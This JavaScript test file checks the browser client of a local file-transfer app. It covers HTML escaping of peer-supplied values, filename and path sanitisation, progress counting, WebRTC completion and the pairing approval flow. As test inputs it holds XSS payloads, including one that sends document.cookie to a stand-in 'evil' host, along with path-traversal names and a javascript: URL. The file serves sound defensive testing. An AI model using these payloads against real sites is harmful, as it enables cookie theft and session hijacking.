// Regression tests for the browser client.
//
// Run with:  node tests/web/test_app.js
//
// These cover the client-side logic that has no Python equivalent: escaping of
// peer-supplied values, filename sanitisation before download, and the byte
// accounting used for progress. They deliberately avoid a DOM implementation
// dependency by exercising the pure helpers with a minimal fake DOM.

const assert = require("node:assert/strict");
const fs = require("node:fs");
const path = require("node:path");
const vm = require("node:vm");

const APP_JS = path.join(__dirname, "..", "..", "src", "seltransfer", "web", "static", "app.js");
const source = fs.readFileSync(APP_JS, "utf8");

// --- minimal DOM -----------------------------------------------------------

class FakeNode {
    constructor(tag) {
        this.tagName = String(tag || "").toUpperCase();
        this.children = [];
        this.attributes = {};
        this.classList = new Set();
        this.hidden = false;
        this.disabled = false;
        this.type = "";
        this._className = "";
        this._text = "";
        this.listeners = {};
    }
    set className(value) { this._className = String(value); this.classList = new Set(this._className.split(/\s+/).filter(Boolean)); }
    get className() { return this._className; }
    set textContent(value) { this._text = value == null ? "" : String(value); this.children = []; }
    get textContent() {
        if (this.children.length) return this.children.map((child) => child.textContent).join("");
        return this._text;
    }
    append(...nodes) { nodes.forEach((node) => this.children.push(typeof node === "string" ? textNode(node) : node)); }
    replaceChildren(...nodes) { this.children = []; this.append(...nodes); }
    addEventListener(type, handler) { (this.listeners[type] ||= []).push(handler); }
    dispatch(type, event) { (this.listeners[type] || []).forEach((handler) => handler(event || {})); }
    setAttribute(name, value) { this.attributes[name] = String(value); }
    querySelectorAll(selector) { return this.descendants().filter((node) => matches(node, selector)); }
    querySelector(selector) { return this.querySelectorAll(selector)[0] || null; }
    descendants() { return this.children.flatMap((child) => (child.descendants ? [child, ...child.descendants()] : [])); }
    get innerHTML() { throw new Error("innerHTML must not be used for peer-supplied values"); }
    set innerHTML(_value) { throw new Error("innerHTML must not be used for peer-supplied values"); }
}

function textNode(value) {
    const node = new FakeNode("#text");
    node.textContent = value;
    return node;
}

function matches(node, selector) {
    return selector.startsWith(".") ? node.classList.has(selector.slice(1)) : node.tagName === selector.toUpperCase();
}

const document = {
    createElement: (tag) => new FakeNode(tag),
    createTextNode: (value) => textNode(value),
    getElementById: () => new FakeNode("div"),
    addEventListener: () => {},
};

// app.js reads Date.now() for its timeout deadlines. A clock the test can move
// lets the timeout be exercised without waiting it out.
let clockOffset = 0;
class TestDate extends Date {
    static now() { return Date.now() + clockOffset; }
}

const sandbox = {
    document,
    window: {},
    localStorage: { getItem: () => null, setItem: () => {}, removeItem: () => {} },
    navigator: { userAgent: "node-test", platform: "node" },
    crypto: { getRandomValues: (bytes) => bytes.fill(1) },
    console,
    setTimeout, clearTimeout, setInterval, clearInterval,
    Date: TestDate,
    AbortController, fetch: async () => { throw new Error("no network in tests"); },
};
sandbox.globalThis = sandbox;
vm.createContext(sandbox);
vm.runInContext(source, sandbox, { filename: "app.js" });

// `class` declarations are lexical bindings, not sandbox properties, so read them
// back out of the same context rather than off the global object.
const TransferProgress = vm.runInContext("TransferProgress", sandbox);

// Class methods live on the prototype, so grab one off the shared prototype
// rather than instantiating the app, which would want a real DOM.
function extractMethod(name) {
    const AppClass = vm.runInContext("SeltransferApp", sandbox);
    return AppClass.prototype[name];
}

const results = [];
const pending = [];
function test(name, fn) {
    try {
        const outcome = fn();
        // Async tests report themselves when they settle.
        if (outcome && typeof outcome.then === "function") {
            pending.push(outcome.then(
                () => results.push({ name, ok: true }),
                (error) => results.push({ name, ok: false, error })
            ));
            return;
        }
        results.push({ name, ok: true });
    }
    catch (error) { results.push({ name, ok: false, error }); }
}

// --- tests -----------------------------------------------------------------

test("buildDeviceDetails never touches innerHTML", () => {
    const panel = sandbox.buildDeviceDetails({ device_id: "abc-123", transport: ["http"], ip: "10.0.0.1" });
    assert.equal(panel.className, "device-details");
    assert.ok(panel.textContent.includes("abc-123"));
    assert.ok(panel.textContent.includes("10.0.0.1"));
    // The FakeNode innerHTML setter throws, so constructing proves the helper
    // builds nodes rather than markup.
});

test("peer-supplied device_id is rendered as text, not markup", () => {
    const hostile = '<img src=x onerror="fetch(\'//evil/\'+document.cookie)">';
    const panel = sandbox.buildDeviceDetails({ device_id: hostile, ip: "10.0.0.1" });
    assert.equal(panel.querySelectorAll("IMG").length, 0, "no element may be created from device_id");
    assert.ok(panel.textContent.includes(hostile), "the raw value must survive as literal text");
});

test("hostile ip and transport values cannot inject elements", () => {
    const panel = sandbox.buildDeviceDetails({
        device_id: "safe-id",
        ip: "<script>alert(1)</script>",
        transport: ["<svg onload=alert(1)>"],
    });
    assert.equal(panel.querySelectorAll("SCRIPT").length, 0);
    assert.equal(panel.querySelectorAll("SVG").length, 0);
});

test("missing fields degrade to placeholders rather than undefined", () => {
    const panel = sandbox.buildDeviceDetails({});
    const text = panel.textContent;
    assert.ok(!text.includes("undefined"), text);
    assert.ok(text.includes("unknown"));
});

test("downloadFileName strips any directory component", () => {
    assert.equal(sandbox.downloadFileName("folder/sub/report.pdf"), "report.pdf");
    assert.equal(sandbox.downloadFileName("..\\..\\windows\\system32\\evil.dll"), "evil.dll");
    assert.equal(sandbox.downloadFileName("C:/absolute/path/file.txt"), "file.txt");
    assert.equal(sandbox.downloadFileName("plain.txt"), "plain.txt");
});

test("downloadFileName refuses empty and traversal-only names", () => {
    for (const bad of ["", "   ", "..", ".", "/", "\\", "../.."]) {
        assert.throws(() => sandbox.downloadFileName(bad), /filename/i, `expected rejection for ${JSON.stringify(bad)}`);
    }
});

test("safeRelativeName mirrors the server's path sanitisation", () => {
    assert.equal(sandbox.safeRelativeName("folder/report.pdf"), "folder/report.pdf");
    assert.equal(sandbox.safeRelativeName('a<b>c:d"e|f?g*h.txt'), "a_b_c_d_e_f_g_h.txt");
    assert.throws(() => sandbox.safeRelativeName("../escape.txt"));
    assert.throws(() => sandbox.safeRelativeName("/absolute.txt"));
    assert.throws(() => sandbox.safeRelativeName("C:/windows.txt"));
    assert.throws(() => sandbox.safeRelativeName("a//b.txt"));
});

test("TransferProgress never reports more than the declared total", () => {
    const progress = new TransferProgress(10);
    progress.add(4); progress.add(4);
    assert.equal(progress.bytes, 8);
    assert.equal(progress.percent(10), 80);
    progress.add(9); // a retried or oversized chunk must be clamped, not trusted
    assert.equal(progress.bytes, 10);
    assert.equal(progress.percent(10), 100);
});

test("TransferProgress treats a zero-byte transfer as complete", () => {
    const progress = new TransferProgress(0);
    assert.equal(progress.percent(0), 100);
});

test("TransferProgress can be rolled back after a failed file", () => {
    const progress = new TransferProgress(10);
    progress.add(6);
    progress.rollback(6);
    assert.equal(progress.bytes, 0);
    assert.equal(progress.percent(10), 0);
});

// --- WebRTC completion gate --------------------------------------------------
// The peer used to be closed as soon as every file-*start* had arrived, which
// tore the data channel down before the bytes of a large file were delivered.

test("the WebRTC wait ignores files that have only started", async () => {
    const waitForWebRTCFiles = extractMethod("waitForWebRTCFiles");
    const completed = new Set([0]);
    const settled = { value: undefined };
    const promise = waitForWebRTCFiles.call(
        { waitForWebRTCFiles },
        completed, 2
    ).then(() => { settled.value = "resolved"; });

    // Started but not finished is not enough for a two-file transfer.
    await new Promise((resolve) => setTimeout(resolve, 300));
    assert.equal(settled.value, undefined);

    completed.add(1);
    await promise;
    assert.equal(settled.value, "resolved");
});

test("the WebRTC wait rejects rather than hanging past its deadline", async () => {
    const waitForWebRTCFiles = extractMethod("waitForWebRTCFiles");
    const promise = waitForWebRTCFiles.call(
        { waitForWebRTCFiles }, new Set(), 1
    );
    // One 200ms poll, then the deadline is behind us.
    await new Promise((resolve) => setTimeout(resolve, 250));
    clockOffset += 130_000;
    try {
        const outcome = await Promise.race([
            promise.then(() => "resolved", (error) => error.message),
            new Promise((resolve) => setTimeout(
                () => resolve("still-pending"), 500)),
        ]);
        assert.equal(outcome, "WebRTC transfer timed out.");
    } finally {
        clockOffset = 0;
    }
});

// --- pairing ----------------------------------------------------------------
//
// Pairing is the one place the client has to know *who it is*: this machine's own
// user pairs with one click, and anything else needs a code read off the
// destination's screen. Getting that backwards would either lock out a legitimate
// sender or offer one-click pairing to a peer, so the branching is pinned here.

function fakeApp(overrides = {}) {
    const elements = {};
    const app = {
        localUser: undefined,
        selected: null,
        expanded: new Set(),
        $: (id) => (elements[id] ||= new FakeNode("div")),
        showError: () => {},
        ...overrides,
    };
    return { app, elements };
}

const DEVICE = { device_id: "target-0001", display_name: "Target", device_type: "phone", status: "online" };

test("a 403 on pairing offers to ask this machine's user to approve", async () => {
    const { app } = fakeApp({ localUser: false });
    app.renderDevices = () => {};
    app.showApprovalRequest = () => { app.__requestShown = true; };
    app.hideApprovalRequest = () => {};
    const forbidden = new Error("pairing requires this machine's own user");
    forbidden.status = 403;
    app.api = async () => { throw forbidden; };

    await extractMethod("select").call(app, DEVICE);

    assert.equal(app.__requestShown, true, "the approval request must be offered");
    assert.equal(app.$("pair-status").textContent, "Needs the user of this machine");
    assert.equal(app.$("send-files").disabled, true, "sending stays blocked");
});

test("a local user pairs with one click and sending unlocks", async () => {
    const { app } = fakeApp({ localUser: true });
    app.renderDevices = () => {};
    app.hideApprovalRequest = () => {};
    app.api = async () => ({});

    await extractMethod("select").call(app, DEVICE);

    assert.equal(app.$("pair-status").textContent, "Paired");
    assert.equal(app.$("send-files").disabled, false);
    assert.equal(app.$("send-folder").disabled, false);
});

test("any other pairing failure reports the reason and stays blocked", async () => {
    const { app } = fakeApp({ localUser: false });
    app.renderDevices = () => {};
    app.hideApprovalRequest = () => {};
    app.showApprovalRequest = () => { app.__requestShown = true; };
    const boom = new Error("destination device is unavailable");
    boom.status = 404;
    app.api = async () => { throw boom; };

    await extractMethod("select").call(app, DEVICE);

    assert.equal(app.__requestShown, undefined, "a 404 is not an approval case");
    assert.equal(app.$("pair-status").textContent, "destination device is unavailable");
    assert.equal(app.$("send-files").disabled, true);
});

test("the client no longer offers a way to type a pairing code", () => {
    // The flow is Approve-only: the destination's user clicks, and no code is
    // read out or entered anywhere. The endpoints still exist for API callers.
    assert.doesNotMatch(source, /pair-code-input/, "no code input may be referenced");
    assert.doesNotMatch(source, /submitPairingCode/, "the code submission path is gone");
    assert.doesNotMatch(source, /pair\/confirm/, "the client must not confirm codes");
    assert.doesNotMatch(source, /showCodeEntry|hideCodeEntry/, "the code box helpers are gone");
});

test("asking for access posts a request and says what happens next", async () => {
    const { app } = fakeApp({ localUser: false });
    const calls = [];
    app.api = async (url, options) => { calls.push([url, options]); return { status: "pending", request_id: "req-1" }; };
    app.selected = DEVICE;
    app.startApprovalPoll = () => { app.__polling = true; };

    await extractMethod("requestApproval").call(app);

    assert.equal(calls[0][0], "/api/devices/target-0001/pair/request");
    assert.match(app.$("pair-status").textContent, /approve/i);
    assert.equal(app.awaitingApproval, "req-1");
    assert.equal(app.__polling, true, "the requester waits for approval");
});

test("asking with no device selected does nothing", async () => {
    const { app } = fakeApp({ localUser: false });
    let called = false;
    app.api = async () => { called = true; return {}; };

    await extractMethod("requestApproval").call(app);

    assert.equal(called, false, "nothing to ask about without a destination");
});

test("approval is detected by polling, and unlocks sending", async () => {
    const { app } = fakeApp({ localUser: false });
    app.hideCodeEntry = () => {};
    app.stopApprovalPoll = extractMethod("stopApprovalPoll");
    app.awaitingApproval = "req-1";
    app.selected = DEVICE;
    let polls = 0;
    app.api = async () => { polls += 1; return { paired: true, method: "approved" }; };

    await extractMethod("checkApproval").call(app);

    assert.equal(polls, 1);
    assert.equal(app.$("pair-status").textContent, "Paired");
    assert.equal(app.$("send-files").disabled, false);
    assert.equal(app.awaitingApproval, null, "the poll stops once paired");
});

test("an unpaired destination keeps the requester waiting", async () => {
    const { app } = fakeApp({ localUser: false });
    app.hideCodeEntry = () => {};
    app.awaitingApproval = "req-1";
    app.selected = DEVICE;
    app.api = async () => ({ paired: false });
    // Sends stay blocked from the failed pairing attempt that led here.
    app.$("send-files").disabled = true;
    app.$("send-folder").disabled = true;

    await extractMethod("checkApproval").call(app);

    assert.equal(app.awaitingApproval, "req-1", "still waiting");
    assert.equal(app.$("send-files").disabled, true, "polling must not unlock sending");
});

test("a destination that disappears stops the approval poll", async () => {
    // Otherwise the interval runs forever against a device that is gone.
    const { app } = fakeApp({ localUser: false });
    app.stopApprovalPoll = extractMethod("stopApprovalPoll");
    app.awaitingApproval = "req-1";
    app.selected = DEVICE;
    app.api = async () => { throw Object.assign(new Error("gone"), { status: 404 }); };

    await extractMethod("checkApproval").call(app);

    assert.equal(app.awaitingApproval, null);
    assert.match(app.$("pair-status").textContent, /unavailable/i);
});

test("the pending panel is only rendered for the machine's own user", async () => {
    // A remote browser must never even try: the endpoint would refuse it, and the
    // panel has no meaning for a device that cannot approve anything.
    const { app } = fakeApp({ localUser: false });
    let called = false;
    app.api = async () => { called = true; return { requests: [] }; };

    await extractMethod("loadPendingPairings").call(app);

    assert.equal(called, false);
});

test("the local user's panel names the requester as text, never as markup", async () => {
    // The panel has to identify who is asking before the user clicks Approve, and
    // device_id is peer-supplied, so it goes in as text. The FakeNode innerHTML
    // setter throws, so constructing the row proves it is built from nodes.
    const { app } = fakeApp({ localUser: true });
    const list = app.$("pairing-pending");
    const hostile = "<img src=x onerror=alert(1)>";
    app.api = async () => ({
        requests: [{ request_id: "req-1", device_id: hostile, code: "48192637", seconds_remaining: 118 }],
    });

    await extractMethod("loadPendingPairings").call(app);

    assert.equal(app.$("pairing-panel").hidden, false);
    const row = list.children[0];
    const who = row.children[0];
    assert.equal(who.tagName, "SPAN");
    assert.equal(who.textContent, hostile.slice(0, 8), "the id survives as literal text");
    assert.equal(row.querySelectorAll("IMG").length, 0, "no element may come from device_id");
    assert.ok(row.textContent.includes("118"), "the countdown is shown");
});

test("the local user's panel does not render the pairing code", async () => {
    // There is no field to type a code into any more, so a big readable code next
    // to an Approve button would only invite reading it out for no purpose.
    const { app } = fakeApp({ localUser: true });
    const list = app.$("pairing-pending");
    app.api = async () => ({
        requests: [{ request_id: "req-1", device_id: "target-0001", code: "48192637", seconds_remaining: 118 }],
    });

    await extractMethod("loadPendingPairings").call(app);

    const row = list.children[0];
    assert.ok(!row.textContent.includes("48192637"), "the code must not be on screen");
    assert.equal(row.querySelector("CODE"), null, "no code element is rendered");
});

test("the local user's panel offers an Approve button per request", async () => {
    // Approval is the primary path: the click is the intent, so the other device
    // never has to read a code out. This panel only renders for the local user,
    // so a peer can neither see nor press it.
    const { app } = fakeApp({ localUser: true });
    const list = app.$("pairing-pending");
    app.api = async () => ({
        requests: [{ request_id: "req-1", device_id: "target-0001", code: "48192637", seconds_remaining: 118 }],
    });

    await extractMethod("loadPendingPairings").call(app);

    const button = list.children[0].querySelector("button");
    assert.ok(button, "an Approve button must be offered");
    assert.equal(button.textContent, "Approve");
    assert.equal(button.type, "button");
});

test("pressing Approve posts to the approve endpoint and refreshes", async () => {
    const { app } = fakeApp({ localUser: true });
    const calls = [];
    let refreshed = 0;
    app.api = async (url, options) => {
        calls.push([url, options]);
        return { requests: [], status: "paired" };
    };
    app.loadPendingPairings = async () => { refreshed += 1; };
    app.loadDevices = async () => { refreshed += 1; };

    await extractMethod("approvePairing").call(app, "req-1");

    assert.equal(calls[0][0], "/api/pairing/requests/req-1/approve");
    assert.equal(calls[0][1].method, "POST");
    assert.equal(refreshed, 2, "the panel and device list both refresh");
});

test("the upload progress counter counts received_files keys", async () => {
    // received_files is an object keyed by file index, not an array, so reading
    // .length off it yields undefined and the counter shows "undefined/1".
    // The loop still behaved correctly - undefined >= 1 is false - which is why
    // this only ever showed up as a wrong number on screen.
    const { app } = fakeApp();
    const statuses = [];
    app.setStatus = (message) => statuses.push(message);
    let poll = 0;
    app.api = async () => {
        poll += 1;
        if (poll === 1) return { status: "PENDING", received_files: {} };
        throw new Error("stop after the first progress message");
    };

    await assert.rejects(
        extractMethod("receiveViaHttp").call(app, {
            transfer_id: "transfer-01",
            files: [{ name: "a.bin", size: 1 }],
        }),
        /stop after the first progress message/);

    const waiting = statuses.filter((message) => /Waiting for the sender/.test(message));
    assert.equal(waiting.length, 1);
    assert.match(waiting[0], /0\/1/, `expected a real count, got ${JSON.stringify(waiting)}`);
    assert.doesNotMatch(waiting[0], /undefined/);
});

test("the counter reflects files that have partly arrived", async () => {
    // Counting keys rather than assuming 0..n-1 means a partial set is reported
    // accurately; two of three landing shows 2/3, not 0/3.
    const { app } = fakeApp();
    const statuses = [];
    app.setStatus = (message) => statuses.push(message);
    let poll = 0;
    app.api = async () => {
        poll += 1;
        if (poll === 1) return { status: "PENDING", received_files: { "0": "/tmp/a.bin", "1": "/tmp/b.bin" } };
        throw new Error("stop after the first progress message");
    };

    await assert.rejects(
        extractMethod("receiveViaHttp").call(app, {
            transfer_id: "transfer-01",
            files: [{ name: "a.bin", size: 1 }, { name: "b.bin", size: 1 }, { name: "c.bin", size: 1 }],
        }),
        /stop after the first progress message/);

    assert.match(statuses[0], /2\/3/, `expected 2/3, got ${JSON.stringify(statuses[0])}`);
});

test("an absent received_files counts as zero rather than undefined", async () => {
    // || {} guards the missing key; Object.keys({}) is 0, so the message is still
    // a real number on the very first poll of a fresh transfer.
    const { app } = fakeApp();
    const statuses = [];
    app.setStatus = (message) => statuses.push(message);
    let poll = 0;
    app.api = async () => {
        poll += 1;
        if (poll === 1) return { status: "PENDING" };
        throw new Error("stop after the first progress message");
    };

    await assert.rejects(
        extractMethod("receiveViaHttp").call(app, {
            transfer_id: "transfer-01",
            files: [{ name: "a.bin", size: 1 }],
        }),
        /stop after the first progress message/);

    assert.match(statuses[0], /0\/1/, `expected 0/1, got ${JSON.stringify(statuses[0])}`);
});

// --- sharing the connection -------------------------------------------------
//
// Every device with the page open has to be able to pass the address on, so the
// panel is pinned to two rules: the address is rendered as text and never as
// markup, and the panel works without the clipboard or the share sheet, which
// are both unavailable on a plain-HTTP LAN origin - the origin this tool hands
// out. Swapping `sandbox.navigator` is how a browser that does have them is
// simulated, since the client reads the global at call time.

test("sharePayload carries the address as text", () => {
    const payload = sandbox.sharePayload("http://192.168.1.5:8765");
    assert.equal(payload.text, "http://192.168.1.5:8765");
    assert.equal(payload.title, "SELTRANSFER");
});

test("sharePayload refuses anything that is not an http address", () => {
    // A share sheet is a one-tap delivery mechanism. Handing it a javascript:
    // URL would put script execution in the app the user picked.
    for (const bad of ["", "   ", "javascript:alert(1)", "data:text/html,<script>", "file:///c:/", "http://", null, undefined]) {
        assert.throws(() => sandbox.sharePayload(bad), /no connection address/i, `expected rejection for ${JSON.stringify(bad)}`);
    }
});

test("the panel shows the address as text and points the image at the endpoint", async () => {
    const { app } = fakeApp();
    const address = "http://192.168.1.5:8765";

    await extractMethod("renderSharePanel").call(app, address);

    assert.equal(app.$("share-url").textContent, address);
    assert.equal(app.$("share-qr").src, "/api/qr.svg", "the address never reaches an attribute");
    assert.equal(app.$("share-qr").hidden, false);
    assert.equal(app.$("share-copy").disabled, false);
});

test("a hostile address cannot become markup in the share panel", () => {
    const { app } = fakeApp();
    const hostile = '<img src=x onerror="fetch(\'//evil/\'+document.cookie)">';

    extractMethod("renderSharePanel").call(app, hostile);

    assert.equal(app.$("share-url").textContent, hostile, "the raw value survives as literal text");
    assert.equal(app.$("share-url").querySelectorAll("IMG").length, 0, "no element may come from the address");
    assert.equal(app.$("share-qr").querySelectorAll("IMG").length, 0, "the image element is not rebuilt from it");
});

test("an empty address hides the image instead of showing a broken one", () => {
    const { app } = fakeApp();

    extractMethod("renderSharePanel").call(app, "");

    assert.equal(app.$("share-qr").hidden, true);
    assert.equal(app.$("share-copy").disabled, true);
    assert.equal(app.$("share-url").textContent, "Connecting...");
});

test("copying says so plainly when the clipboard is unavailable", async () => {
    // http://<lan-ip> is not a secure context, so navigator.clipboard is normally
    // missing here. The address is on screen either way, so the message has to
    // tell the user what to do rather than reporting a failure.
    const { app } = fakeApp();
    assert.equal(sandbox.navigator.clipboard, undefined, "the sandbox browser has no clipboard");
    extractMethod("renderSharePanel").call(app, "http://192.168.1.5:8765");

    await extractMethod("copyShareLink").call(app);

    assert.match(app.$("share-status").textContent, /copy it/i);
    assert.equal(app.$("share-url").textContent, "http://192.168.1.5:8765", "the address stays readable");
});

test("copying uses the clipboard when the browser has one", async () => {
    const { app } = fakeApp();
    const written = [];
    const original = sandbox.navigator;
    extractMethod("renderSharePanel").call(app, "http://192.168.1.5:8765");
    sandbox.navigator = { ...original, clipboard: { writeText: async (value) => { written.push(value); } } };
    try {
        await extractMethod("copyShareLink").call(app);
    } finally {
        sandbox.navigator = original;
    }

    assert.deepEqual(written, ["http://192.168.1.5:8765"]);
    assert.match(app.$("share-status").textContent, /copied/i);
});

test("the share button is offered only where the browser can share", async () => {
    const { app } = fakeApp();
    const original = sandbox.navigator;

    sandbox.navigator = original;
    extractMethod("renderSharePanel").call(app, "http://192.168.1.5:8765");
    assert.equal(app.$("share-share").hidden, true, "no share sheet means no button");

    let shared = null;
    sandbox.navigator = { ...original, share: async (payload) => { shared = payload; } };
    try {
        extractMethod("renderSharePanel").call(app, "http://192.168.1.5:8765");
        assert.equal(app.$("share-share").hidden, false, "the button appears when sharing is possible");
        await extractMethod("shareConnection").call(app);
    } finally {
        sandbox.navigator = original;
    }

    assert.equal(shared.text, "http://192.168.1.5:8765");
});

test("a dismissed share sheet is not reported as a failure", async () => {
    // The user closing the sheet is a decision, not an error, and a message here
    // would train people to ignore this line.
    const { app } = fakeApp({ connectionUrl: "http://192.168.1.5:8765" });
    const original = sandbox.navigator;
    sandbox.navigator = {
        ...original,
        share: async () => { throw Object.assign(new Error("cancelled"), { name: "AbortError" }); },
    };
    try {
        await extractMethod("shareConnection").call(app);
    } finally {
        sandbox.navigator = original;
    }

    assert.equal(app.$("share-status").textContent, "");
});

// --- report ----------------------------------------------------------------

Promise.all(pending).then(() => {
    let failed = 0;
    // Async results land after the synchronous ones, so sort for stable output.
    for (const result of results) {
        if (result.ok) {
            console.log(`ok   ${result.name}`);
        } else {
            failed += 1;
            console.log(`FAIL ${result.name}\n     ${result.error.message}`);
        }
    }
    console.log(`\n${results.length - failed} passed, ${failed} failed`);
    process.exit(failed === 0 ? 0 : 1);
});
